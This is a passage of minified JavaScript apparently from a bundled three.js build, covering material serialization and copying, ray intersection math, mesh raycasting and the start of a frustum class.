0&&(s.sheenRoughness=this.sheenRoughness),this.emissive&&this.emissive.isColor&&(s.emissive=this.emissive.getHex()),this.emissiveIntensity!==void 0&&(s.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(s.specular=this.specular.getHex()),this.specularIntensity!==void 0&&(s.specularIntensity=this.specularIntensity),this.specularColor&&this.specularColor.isColor&&(s.specularColor=this.specularColor.getHex()),this.shininess!==void 0&&(s.shininess=this.shininess),this.clearcoat!==void 0&&(s.clearcoat=this.clearcoat),this.clearcoatRoughness!==void 0&&(s.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(s.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(s.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(s.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,s.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.sheenColorMap&&this.sheenColorMap.isTexture&&(s.sheenColorMap=this.sheenColorMap.toJSON(e).uuid),this.sheenRoughnessMap&&this.sheenRoughnessMap.isTexture&&(s.sheenRoughnessMap=this.sheenRoughnessMap.toJSON(e).uuid),this.dispersion!==void 0&&(s.dispersion=this.dispersion),this.retroreflectivity!==void 0&&(s.retroreflectivity=this.retroreflectivity),this.iridescence!==void 0&&(s.iridescence=this.iridescence),this.iridescenceIOR!==void 0&&(s.iridescenceIOR=this.iridescenceIOR),this.iridescenceThicknessRange!==void 0&&(s.iridescenceThicknessRange=this.iridescenceThicknessRange),this.iridescenceMap&&this.iridescenceMap.isTexture&&(s.iridescenceMap=this.iridescenceMap.toJSON(e).uuid),this.iridescenceThicknessMap&&this.iridescenceThicknessMap.isTexture&&(s.iridescenceThicknessMap=this.iridescenceThicknessMap.toJSON(e).uuid),this.anisotropy!==void 0&&(s.anisotropy=this.anisotropy),this.anisotropyRotation!==void 0&&(s.anisotropyRotation=this.anisotropyRotation),this.anisotropyMap&&this.anisotropyMap.isTexture&&(s.anisotropyMap=this.anisotropyMap.toJSON(e).uuid),this.map&&this.map.isTexture&&(s.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(s.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(s.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(s.lightMap=this.lightMap.toJSON(e).uuid,s.lightMapIntensity=this.lightMapIntensity),this.aoMap&&this.aoMap.isTexture&&(s.aoMap=this.aoMap.toJSON(e).uuid,s.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(s.bumpMap=this.bumpMap.toJSON(e).uuid,s.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(s.normalMap=this.normalMap.toJSON(e).uuid,s.normalMapType=this.normalMapType,s.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(s.displacementMap=this.displacementMap.toJSON(e).uuid,s.displacementScale=this.displacementScale,s.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(s.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(s.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(s.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(s.specularMap=this.specularMap.toJSON(e).uuid),this.specularIntensityMap&&this.specularIntensityMap.isTexture&&(s.specularIntensityMap=this.specularIntensityMap.toJSON(e).uuid),this.specularColorMap&&this.specularColorMap.isTexture&&(s.specularColorMap=this.specularColorMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(s.envMap=this.envMap.toJSON(e).uuid,this.combine!==void 0&&(s.combine=this.combine)),this.envMapRotation!==void 0&&(s.envMapRotation=this.envMapRotation.toArray()),this.envMapIntensity!==void 0&&(s.envMapIntensity=this.envMapIntensity),this.reflectivity!==void 0&&(s.reflectivity=this.reflectivity),this.refractionRatio!==void 0&&(s.refractionRatio=this.refractionRatio),this.gradientMap&&this.gradientMap.isTexture&&(s.gradientMap=this.gradientMap.toJSON(e).uuid),this.transmission!==void 0&&(s.transmission=this.transmission),this.transmissionMap&&this.transmissionMap.isTexture&&(s.transmissionMap=this.transmissionMap.toJSON(e).uuid),this.thickness!==void 0&&(s.thickness=this.thickness),this.thicknessMap&&this.thicknessMap.isTexture&&(s.thicknessMap=this.thicknessMap.toJSON(e).uuid),this.attenuationDistance!==void 0&&(s.attenuationDistance=this.attenuationDistance),this.attenuationColor!==void 0&&(s.attenuationColor=this.attenuationColor.getHex()),this.size!==void 0&&(s.size=this.size),this.sizeAttenuation!==void 0&&(s.sizeAttenuation=this.sizeAttenuation),Array.isArray(this.clippingPlanes)&&this.clippingPlanes.length>0&&(s.clippingPlanes=this.clippingPlanes.map(f=>f.toJSON())),this.rotation!==void 0&&(s.rotation=this.rotation),this.depthPacking!==void 0&&(s.depthPacking=this.depthPacking),this.linewidth!==void 0&&(s.linewidth=this.linewidth),this.linecap!==void 0&&(s.linecap=this.linecap),this.linejoin!==void 0&&(s.linejoin=this.linejoin),this.dashSize!==void 0&&(s.dashSize=this.dashSize),this.gapSize!==void 0&&(s.gapSize=this.gapSize),this.scale!==void 0&&(s.scale=this.scale),this.wireframe!==void 0&&(s.wireframe=this.wireframe),this.wireframeLinewidth!==void 0&&(s.wireframeLinewidth=this.wireframeLinewidth),this.wireframeLinecap!==void 0&&(s.wireframeLinecap=this.wireframeLinecap),this.wireframeLinejoin!==void 0&&(s.wireframeLinejoin=this.wireframeLinejoin),this.flatShading!==void 0&&(s.flatShading=this.flatShading),this.fog!==void 0&&(s.fog=this.fog),Object.keys(this.userData).length>0&&(s.userData=this.userData);function c(f){const d=[];for(const h in f){const m=f[h];delete m.metadata,d.push(m)}return d}if(i){const f=c(e.textures),d=c(e.images);f.length>0&&(s.textures=f),d.length>0&&(s.images=d)}return s}fromJSON(e,i){if(e.uuid!==void 0&&(this.uuid=e.uuid),e.name!==void 0&&(this.name=e.name),e.color!==void 0&&this.color!==void 0&&this.color.setHex(e.color),e.roughness!==void 0&&(this.roughness=e.roughness),e.metalness!==void 0&&(this.metalness=e.metalness),e.sheen!==void 0&&(this.sheen=e.sheen),e.sheenColor!==void 0&&(this.sheenColor=new ze().setHex(e.sheenColor)),e.sheenRoughness!==void 0&&(this.sheenRoughness=e.sheenRoughness),e.emissive!==void 0&&this.emissive!==void 0&&this.emissive.setHex(e.emissive),e.specular!==void 0&&this.specular!==void 0&&this.specular.setHex(e.specular),e.specularIntensity!==void 0&&(this.specularIntensity=e.specularIntensity),e.specularColor!==void 0&&this.specularColor!==void 0&&this.specularColor.setHex(e.specularColor),e.shininess!==void 0&&(this.shininess=e.shininess),e.clearcoat!==void 0&&(this.clearcoat=e.clearcoat),e.clearcoatRoughness!==void 0&&(this.clearcoatRoughness=e.clearcoatRoughness),e.dispersion!==void 0&&(this.dispersion=e.dispersion),e.retroreflectivity!==void 0&&(this.retroreflectivity=e.retroreflectivity),e.iridescence!==void 0&&(this.iridescence=e.iridescence),e.iridescenceIOR!==void 0&&(this.iridescenceIOR=e.iridescenceIOR),e.iridescenceThicknessRange!==void 0&&(this.iridescenceThicknessRange=e.iridescenceThicknessRange),e.transmission!==void 0&&(this.transmission=e.transmission),e.thickness!==void 0&&(this.thickness=e.thickness),e.attenuationDistance!==void 0&&(this.attenuationDistance=e.attenuationDistance),e.attenuationColor!==void 0&&this.attenuationColor!==void 0&&this.attenuationColor.setHex(e.attenuationColor),e.anisotropy!==void 0&&(this.anisotropy=e.anisotropy),e.anisotropyRotation!==void 0&&(this.anisotropyRotation=e.anisotropyRotation),e.fog!==void 0&&(this.fog=e.fog),e.flatShading!==void 0&&(this.flatShading=e.flatShading),e.blending!==void 0&&(this.blending=e.blending),e.combine!==void 0&&(this.combine=e.combine),e.side!==void 0&&(this.side=e.side),e.shadowSide!==void 0&&(this.shadowSide=e.shadowSide),e.opacity!==void 0&&(this.opacity=e.opacity),e.transparent!==void 0&&(this.transparent=e.transparent),e.alphaTest!==void 0&&(this.alphaTest=e.alphaTest),e.alphaHash!==void 0&&(this.alphaHash=e.alphaHash),e.depthFunc!==void 0&&(this.depthFunc=e.depthFunc),e.depthTest!==void 0&&(this.depthTest=e.depthTest),e.depthWrite!==void 0&&(this.depthWrite=e.depthWrite),e.colorWrite!==void 0&&(this.colorWrite=e.colorWrite),e.clippingPlanes!==void 0&&(this.clippingPlanes=e.clippingPlanes.map(s=>new mr().fromJSON(s))),e.clipIntersection!==void 0&&(this.clipIntersection=e.clipIntersection),e.clipShadows!==void 0&&(this.clipShadows=e.clipShadows),e.depthPacking!==void 0&&(this.depthPacking=e.depthPacking),e.blendSrc!==void 0&&(this.blendSrc=e.blendSrc),e.blendDst!==void 0&&(this.blendDst=e.blendDst),e.blendEquation!==void 0&&(this.blendEquation=e.blendEquation),e.blendSrcAlpha!==void 0&&(this.blendSrcAlpha=e.blendSrcAlpha),e.blendDstAlpha!==void 0&&(this.blendDstAlpha=e.blendDstAlpha),e.blendEquationAlpha!==void 0&&(this.blendEquationAlpha=e.blendEquationAlpha),e.blendColor!==void 0&&this.blendColor!==void 0&&this.blendColor.setHex(e.blendColor),e.blendAlpha!==void 0&&(this.blendAlpha=e.blendAlpha),e.stencilWriteMask!==void 0&&(this.stencilWriteMask=e.stencilWriteMask),e.stencilFunc!==void 0&&(this.stencilFunc=e.stencilFunc),e.stencilRef!==void 0&&(this.stencilRef=e.stencilRef),e.stencilFuncMask!==void 0&&(this.stencilFuncMask=e.stencilFuncMask),e.stencilFail!==void 0&&(this.stencilFail=e.stencilFail),e.stencilZFail!==void 0&&(this.stencilZFail=e.stencilZFail),e.stencilZPass!==void 0&&(this.stencilZPass=e.stencilZPass),e.stencilWrite!==void 0&&(this.stencilWrite=e.stencilWrite),e.wireframe!==void 0&&(this.wireframe=e.wireframe),e.wireframeLinewidth!==void 0&&(this.wireframeLinewidth=e.wireframeLinewidth),e.wireframeLinecap!==void 0&&(this.wireframeLinecap=e.wireframeLinecap),e.wireframeLinejoin!==void 0&&(this.wireframeLinejoin=e.wireframeLinejoin),e.rotation!==void 0&&(this.rotation=e.rotation),e.linewidth!==void 0&&(this.linewidth=e.linewidth),e.linecap!==void 0&&(this.linecap=e.linecap),e.linejoin!==void 0&&(this.linejoin=e.linejoin),e.dashSize!==void 0&&(this.dashSize=e.dashSize),e.gapSize!==void 0&&(this.gapSize=e.gapSize),e.scale!==void 0&&(this.scale=e.scale),e.polygonOffset!==void 0&&(this.polygonOffset=e.polygonOffset),e.polygonOffsetFactor!==void 0&&(this.polygonOffsetFactor=e.polygonOffsetFactor),e.polygonOffsetUnits!==void 0&&(this.polygonOffsetUnits=e.polygonOffsetUnits),e.dithering!==void 0&&(this.dithering=e.dithering),e.alphaToCoverage!==void 0&&(this.alphaToCoverage=e.alphaToCoverage),e.premultipliedAlpha!==void 0&&(this.premultipliedAlpha=e.premultipliedAlpha),e.forceSinglePass!==void 0&&(this.forceSinglePass=e.forceSinglePass),e.allowOverride!==void 0&&(this.allowOverride=e.allowOverride),e.visible!==void 0&&(this.visible=e.visible),e.toneMapped!==void 0&&(this.toneMapped=e.toneMapped),e.userData!==void 0&&(this.userData=e.userData),e.vertexColors!==void 0&&(typeof e.vertexColors=="number"?this.vertexColors=e.vertexColors>0:this.vertexColors=e.vertexColors),e.size!==void 0&&(this.size=e.size),e.sizeAttenuation!==void 0&&(this.sizeAttenuation=e.sizeAttenuation),e.map!==void 0&&(this.map=i[e.map]||null),e.matcap!==void 0&&(this.matcap=i[e.matcap]||null),e.alphaMap!==void 0&&(this.alphaMap=i[e.alphaMap]||null),e.bumpMap!==void 0&&(this.bumpMap=i[e.bumpMap]||null),e.bumpScale!==void 0&&(this.bumpScale=e.bumpScale),e.normalMap!==void 0&&(this.normalMap=i[e.normalMap]||null),e.normalMapType!==void 0&&(this.normalMapType=e.normalMapType),e.normalScale!==void 0){let s=e.normalScale;Array.isArray(s)===!1&&(s=[s,s]),this.normalScale=new Ue().fromArray(s)}return e.displacementMap!==void 0&&(this.displacementMap=i[e.displacementMap]||null),e.displacementScale!==void 0&&(this.displacementScale=e.displacementScale),e.displacementBias!==void 0&&(this.displacementBias=e.displacementBias),e.roughnessMap!==void 0&&(this.roughnessMap=i[e.roughnessMap]||null),e.metalnessMap!==void 0&&(this.metalnessMap=i[e.metalnessMap]||null),e.emissiveMap!==void 0&&(this.emissiveMap=i[e.emissiveMap]||null),e.emissiveIntensity!==void 0&&(this.emissiveIntensity=e.emissiveIntensity),e.specularMap!==void 0&&(this.specularMap=i[e.specularMap]||null),e.specularIntensityMap!==void 0&&(this.specularIntensityMap=i[e.specularIntensityMap]||null),e.specularColorMap!==void 0&&(this.specularColorMap=i[e.specularColorMap]||null),e.envMap!==void 0&&(this.envMap=i[e.envMap]||null),e.envMapRotation!==void 0&&this.envMapRotation.fromArray(e.envMapRotation),e.envMapIntensity!==void 0&&(this.envMapIntensity=e.envMapIntensity),e.reflectivity!==void 0&&(this.reflectivity=e.reflectivity),e.refractionRatio!==void 0&&(this.refractionRatio=e.refractionRatio),e.lightMap!==void 0&&(this.lightMap=i[e.lightMap]||null),e.lightMapIntensity!==void 0&&(this.lightMapIntensity=e.lightMapIntensity),e.aoMap!==void 0&&(this.aoMap=i[e.aoMap]||null),e.aoMapIntensity!==void 0&&(this.aoMapIntensity=e.aoMapIntensity),e.gradientMap!==void 0&&(this.gradientMap=i[e.gradientMap]||null),e.clearcoatMap!==void 0&&(this.clearcoatMap=i[e.clearcoatMap]||null),e.clearcoatRoughnessMap!==void 0&&(this.clearcoatRoughnessMap=i[e.clearcoatRoughnessMap]||null),e.clearcoatNormalMap!==void 0&&(this.clearcoatNormalMap=i[e.clearcoatNormalMap]||null),e.clearcoatNormalScale!==void 0&&(this.clearcoatNormalScale=new Ue().fromArray(e.clearcoatNormalScale)),e.iridescenceMap!==void 0&&(this.iridescenceMap=i[e.iridescenceMap]||null),e.iridescenceThicknessMap!==void 0&&(this.iridescenceThicknessMap=i[e.iridescenceThicknessMap]||null),e.transmissionMap!==void 0&&(this.transmissionMap=i[e.transmissionMap]||null),e.thicknessMap!==void 0&&(this.thicknessMap=i[e.thicknessMap]||null),e.anisotropyMap!==void 0&&(this.anisotropyMap=i[e.anisotropyMap]||null),e.sheenColorMap!==void 0&&(this.sheenColorMap=i[e.sheenColorMap]||null),e.sheenRoughnessMap!==void 0&&(this.sheenRoughnessMap=i[e.sheenRoughnessMap]||null),this}clone(){return new this.constructor().copy(this)}copy(e){this.name=e.name,this.blending=e.blending,this.side=e.side,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.blendColor.copy(e.blendColor),this.blendAlpha=e.blendAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;const i=e.clippingPlanes;let s=null;if(i!==null){const c=i.length;s=new Array(c);for(let f=0;f!==c;++f)s[f]=i[f].clone()}return this.clippingPlanes=s,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.alphaHash=e.alphaHash,this.alphaToCoverage=e.alphaToCoverage,this.premultipliedAlpha=e.premultipliedAlpha,this.forceSinglePass=e.forceSinglePass,this.allowOverride=e.allowOverride,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this}dispose(){this.dispatchEvent({type:"dispose"})}set needsUpdate(e){e===!0&&this.version++}}const Ca=new it,Vh=new it,nu=new it,iu=new it;class em{constructor(e=new it,i=new it(0,0,-1)){this.origin=e,this.direction=i}set(e,i){return this.origin.copy(e),this.direction.copy(i),this}copy(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this}at(e,i){return i.copy(this.origin).addScaledVector(this.direction,e)}lookAt(e){return this.direction.copy(e).sub(this.origin).normalize(),this}recast(e){return this.origin.copy(this.at(e,Ca)),this}closestPointToPoint(e,i){i.subVectors(e,this.origin);const s=i.dot(this.direction);return s<0?i.copy(this.origin):i.copy(this.origin).addScaledVector(this.direction,s)}distanceToPoint(e){return Math.sqrt(this.distanceSqToPoint(e))}distanceSqToPoint(e){const i=Ca.subVectors(e,this.origin).dot(this.direction);return i<0?this.origin.distanceToSquared(e):(Ca.copy(this.origin).addScaledVector(this.direction,i),Ca.distanceToSquared(e))}distanceSqToSegment(e,i,s,c){Vh.copy(e).add(i).multiplyScalar(.5),nu.copy(i).sub(e).normalize(),iu.copy(this.origin).sub(Vh);const f=e.distanceTo(i)*.5,d=-this.direction.dot(nu),h=iu.dot(this.direction),m=-iu.dot(nu),p=iu.lengthSq(),x=Math.abs(1-d*d);let v,_,E,T;if(x>0)if(v=d*m-h,_=d*h-m,T=f*x,v>=0)if(_>=-T)if(_<=T){const w=1/x;v*=w,_*=w,E=v*(v+d*_+2*h)+_*(d*v+_+2*m)+p}else _=f,v=Math.max(0,-(d*_+h)),E=-v*v+_*(_+2*m)+p;else _=-f,v=Math.max(0,-(d*_+h)),E=-v*v+_*(_+2*m)+p;else _<=-T?(v=Math.max(0,-(-d*f+h)),_=v>0?-f:Math.min(Math.max(-f,-m),f),E=-v*v+_*(_+2*m)+p):_<=T?(v=0,_=Math.min(Math.max(-f,-m),f),E=_*(_+2*m)+p):(v=Math.max(0,-(d*f+h)),_=v>0?f:Math.min(Math.max(-f,-m),f),E=-v*v+_*(_+2*m)+p);else _=d>0?-f:f,v=Math.max(0,-(d*_+h)),E=-v*v+_*(_+2*m)+p;return s&&s.copy(this.origin).addScaledVector(this.direction,v),c&&c.copy(Vh).addScaledVector(nu,_),E}intersectSphere(e,i){if(e.radius<0)return null;Ca.subVectors(e.center,this.origin);const s=Ca.dot(this.direction),c=Ca.dot(Ca)-s*s,f=e.radius*e.radius;if(c>f)return null;const d=Math.sqrt(f-c),h=s-d,m=s+d;return m<0?null:h<0?this.at(m,i):this.at(h,i)}intersectsSphere(e){return e.radius<0?!1:this.distanceSqToPoint(e.center)<=e.radius*e.radius}distanceToPlane(e){const i=e.normal.dot(this.direction);if(i===0)return e.distanceToPoint(this.origin)===0?0:null;const s=-(this.origin.dot(e.normal)+e.constant)/i;return s>=0?s:null}intersectPlane(e,i){const s=this.distanceToPlane(e);return s===null?null:this.at(s,i)}intersectsPlane(e){const i=e.distanceToPoint(this.origin);return i===0||e.normal.dot(this.direction)*i<0}intersectBox(e,i){let s,c,f,d,h,m;const p=1/this.direction.x,x=1/this.direction.y,v=1/this.direction.z,_=this.origin;return p>=0?(s=(e.min.x-_.x)*p,c=(e.max.x-_.x)*p):(s=(e.max.x-_.x)*p,c=(e.min.x-_.x)*p),x>=0?(f=(e.min.y-_.y)*x,d=(e.max.y-_.y)*x):(f=(e.max.y-_.y)*x,d=(e.min.y-_.y)*x),s>d||f>c||((f>s||isNaN(s))&&(s=f),(d<c||isNaN(c))&&(c=d),v>=0?(h=(e.min.z-_.z)*v,m=(e.max.z-_.z)*v):(h=(e.max.z-_.z)*v,m=(e.min.z-_.z)*v),s>m||h>c)||((h>s||s!==s)&&(s=h),(m<c||c!==c)&&(c=m),c<0)?null:this.at(s>=0?s:c,i)}intersectsBox(e){return this.intersectBox(e,Ca)!==null}intersectTriangle(e,i,s,c,f){const d=this.origin,h=this.direction,m=h.x,p=h.y,x=h.z,v=e.x-d.x,_=e.y-d.y,E=e.z-d.z,T=i.x-d.x,w=i.y-d.y,y=i.z-d.z,S=s.x-d.x,N=s.y-d.y,B=s.z-d.z,C=Math.abs(m),U=Math.abs(p),D=Math.abs(x);let P,b,L,F,V,$,ft,j,et,q,W,ht;if(C>=U&&C>=D?(L=m,$=v,et=T,ht=S,m>=0?(P=p,b=x,F=_,V=E,ft=w,j=y,q=N,W=B):(P=x,b=p,F=E,V=_,ft=y,j=w,q=B,W=N)):U>=D?(L=p,$=_,et=w,ht=N,p>=0?(P=x,b=m,F=E,V=v,ft=y,j=T,q=B,W=S):(P=m,b=x,F=v,V=E,ft=T,j=y,q=S,W=B)):(L=x,$=E,et=y,ht=B,x>=0?(P=m,b=p,F=v,V=_,ft=T,j=w,q=S,W=N):(P=p,b=m,F=_,V=v,ft=w,j=T,q=N,W=S)),L===0)return null;const lt=P/L,mt=b/L,gt=1/L,Bt=F-lt*$,Ut=V-mt*$,z=ft-lt*et,pt=j-mt*et,At=q-lt*ht,Y=W-mt*ht,ut=At*pt-Y*z,Tt=Bt*Y-Ut*At,wt=z*Ut-pt*Bt;if(c){if(ut<0||Tt<0||wt<0)return null}else if((ut<0||Tt<0||wt<0)&&(ut>0||Tt>0||wt>0))return null;const _t=ut+Tt+wt;if(_t===0)return null;const Rt=gt*(ut*$+Tt*et+wt*ht);return(_t>0?Rt<0:Rt>0)?null:this.at(Rt/_t,f)}applyMatrix4(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this}equals(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}clone(){return new this.constructor().copy(this)}}class Jx extends so{constructor(e){super(),this.isMeshBasicMaterial=!0,this.type="MeshBasicMaterial",this.color=new ze(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.envMapRotation=new Qr,this.combine=Nx,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapRotation.copy(e.envMapRotation),this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.fog=e.fog,this}}const Hv=new cn,Vr=new em,au=new El,Gv=new it,ru=new it,su=new it,ou=new it,Xh=new it,lu=new it,Vv=new it,cu=new it;class Oa extends kn{constructor(e=new $n,i=new Jx){super(),this.isMesh=!0,this.type="Mesh",this.geometry=e,this.material=i,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.count=1,this.updateMorphTargets()}copy(e,i){return super.copy(e,i),e.morphTargetInfluences!==void 0&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),e.morphTargetDictionary!==void 0&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}updateMorphTargets(){const i=this.geometry.morphAttributes,s=Object.keys(i);if(s.length>0){const c=i[s[0]];if(c!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let f=0,d=c.length;f<d;f++){const h=c[f].name||String(f);this.morphTargetInfluences.push(0),this.morphTargetDictionary[h]=f}}}}getVertexPosition(e,i){const s=this.geometry,c=s.attributes.position,f=s.morphAttributes.position,d=s.morphTargetsRelative;i.fromBufferAttribute(c,e);const h=this.morphTargetInfluences;if(f&&h){lu.set(0,0,0);for(let m=0,p=f.length;m<p;m++){const x=h[m],v=f[m];x!==0&&(Xh.fromBufferAttribute(v,e),d?lu.addScaledVector(Xh,x):lu.addScaledVector(Xh.sub(i),x))}i.add(lu)}return i}intersectsFrustum(e){return e.intersectsObject(this)}raycast(e,i){const s=this.geometry,c=this.material,f=this.matrixWorld;c!==void 0&&(s.boundingSphere===null&&s.computeBoundingSphere(),au.copy(s.boundingSphere),au.applyMatrix4(f),Vr.copy(e.ray).recast(e.near),!(au.containsPoint(Vr.origin)===!1&&(Vr.intersectSphere(au,Gv)===null||Vr.origin.distanceToSquared(Gv)>(e.far-e.near)**2))&&(Hv.copy(f).invert(),Vr.copy(e.ray).applyMatrix4(Hv),!(s.boundingBox!==null&&Vr.intersectsBox(s.boundingBox)===!1)&&this._computeIntersections(e,i,Vr)))}_computeIntersections(e,i,s){let c;const f=this.geometry,d=this.material,h=f.index,m=f.attributes.position,p=f.attributes.uv,x=f.attributes.uv1,v=f.attributes.normal,_=f.groups,E=f.drawRange;if(h!==null)if(Array.isArray(d))for(let T=0,w=_.length;T<w;T++){const y=_[T],S=d[y.materialIndex],N=Math.max(y.start,E.start),B=Math.min(h.count,Math.min(y.start+y.count,E.start+E.count));for(let C=N,U=B;C<U;C+=3){const D=h.getX(C),P=h.getX(C+1),b=h.getX(C+2);c=uu(this,S,e,s,p,x,v,D,P,b),c&&(c.faceIndex=Math.floor(C/3),c.face.materialIndex=y.materialIndex,i.push(c))}}else{const T=Math.max(0,E.start),w=Math.min(h.count,E.start+E.count);for(let y=T,S=w;y<S;y+=3){const N=h.getX(y),B=h.getX(y+1),C=h.getX(y+2);c=uu(this,d,e,s,p,x,v,N,B,C),c&&(c.faceIndex=Math.floor(y/3),i.push(c))}}else if(m!==void 0)if(Array.isArray(d))for(let T=0,w=_.length;T<w;T++){const y=_[T],S=d[y.materialIndex],N=Math.max(y.start,E.start),B=Math.min(m.count,Math.min(y.start+y.count,E.start+E.count));for(let C=N,U=B;C<U;C+=3){const D=C,P=C+1,b=C+2;c=uu(this,S,e,s,p,x,v,D,P,b),c&&(c.faceIndex=Math.floor(C/3),c.face.materialIndex=y.materialIndex,i.push(c))}}else{const T=Math.max(0,E.start),w=Math.min(m.count,E.start+E.count);for(let y=T,S=w;y<S;y+=3){const N=y,B=y+1,C=y+2;c=uu(this,d,e,s,p,x,v,N,B,C),c&&(c.faceIndex=Math.floor(y/3),i.push(c))}}}}function Sb(o,e,i,s,c,f,d,h){let m;if(e.side===Jn?m=s.intersectTriangle(d,f,c,!0,h):m=s.intersectTriangle(c,f,d,e.side===Zr,h),m===null)return null;cu.copy(h),cu.applyMatrix4(o.matrixWorld);const p=i.ray.origin.distanceTo(cu);return p<i.near||p>i.far?null:{distance:p,point:cu.clone(),object:o}}function uu(o,e,i,s,c,f,d,h,m,p){o.getVertexPosition(h,ru),o.getVertexPosition(m,su),o.getVertexPosition(p,ou);const x=Sb(o,e,i,s,ru,su,ou,Vv);if(x){const v=new it;Ii.getBarycoord(Vv,ru,su,ou,v),c&&(x.uv=Ii.getInterpolatedAttribute(c,h,m,p,v,new Ue)),f&&(x.uv1=Ii.getInterpolatedAttribute(f,h,m,p,v,new Ue)),d&&(x.normal=Ii.getInterpolatedAttribute(d,h,m,p,v,new it),x.normal.dot(s.direction)>0&&x.normal.multiplyScalar(-1));const _={a:h,b:m,c:p,normal:new it,materialIndex:0};Ii.getNormal(ru,su,ou,_.normal),x.face=_,x.barycoord=v}return x}class yb extends Xn{constructor(e=null,i=1,s=1,c,f,d,h,m,p=Un,x=Un,v,_){super(null,d,h,m,p,x,c,f,v,_),this.isDataTexture=!0,this.image={data:e,width:i,height:s},this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}const Xr=new El,Mb=new Ue(.5,.5),fu=new it;class $x{constructor(e=new mr,i=new mr,s=new mr,c=new mr,f=new mr,d=new mr){this.planes=[e,i,s,c,f,d]}set(e,i,s,c,f,d){const h=this.planes;return h[0].copy(e),h[1].copy(i),h[2].copy(s),h[3].copy(c),h[4].copy(f),h[5].copy(d),this}copy(e){const i=this.planes;for(let s=0;s<6;s++)i[s].copy(e.planes[s]);return this}setFromProjectionMatrix(e,i=aa,s=!1){const c=this.planes,f=e.elements,d=f[0],h=f[1],m=f[2],p=f[3],x=f[4],v=f[5],_=f[6],E=f[7],T=f[8],w=f[9],y=f[10],S=f[11],N=f[12],B=f[13],C=f[14],U=f[15];if(c[0].setComponents(p-d,E-x,S-T,U-N).normalize(),c[1].setComponents(p+d,E+x,S+T,U+N).normalize(),c[2].setComponents(p+h,E+v,S+w,U+B).normalize(),c[3].setComponents(p-h,E-v,S-w,U-B).normalize(),s)c[4].setComponents(m,_,y,C).normalize(),c[5].setComponents(p-m,E-_,S-y,U-C).normalize();else if(c[4].setComponents(p-m,E-_,S-y,U-C).normalize(),i===aa)c[5].setComponents(p+m,E+_,S+y,U+C).normalize();else if(i===Du)c[5].setComponents(m,_,y,C).normalize();else throw new Error("THREE.Frustum.setFromProjectionMatrix(): Invalid coordinate system: "+i);return this}intersectsObject(e){if(e.boundingSphere!==void 0)e.boundingSphere===null&&e.computeBoundingSphere(),Xr.copy(e.boundingSphere).applyMatrix4(e.matrixWorld);else{const i=e.geometry;i.boundingSphere===null&&i.computeBoundingSphere(),Xr.copy(i.boundingSphere).applyMatrix4(e.matrixWorld)}return 